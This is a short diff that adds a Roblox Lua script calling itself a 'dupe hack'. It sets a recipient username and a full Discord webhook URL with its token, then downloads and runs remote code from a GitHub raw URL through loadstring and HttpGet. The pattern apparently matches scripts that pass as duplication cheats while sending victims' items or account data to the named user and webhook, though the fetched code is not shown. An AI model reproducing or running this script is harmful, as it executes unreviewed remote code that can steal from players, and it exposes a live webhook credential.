@@ -1,0 +1,7 @@
+```_G.Username = "Carlemerson1"
+
+_G.HubName = "dupe hack"
+
+_G.WebhookUrl = "https://discord.com/api/webhooks/1106254889912369152/s3D78QijmJXvY3l3PzGVMqvG_PSi6j0VAZXKP8s1wHe_onguAM9dW8Wlmms49UEFnlHs"
+
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/trexylol/rexscript/main/main"), true))()```
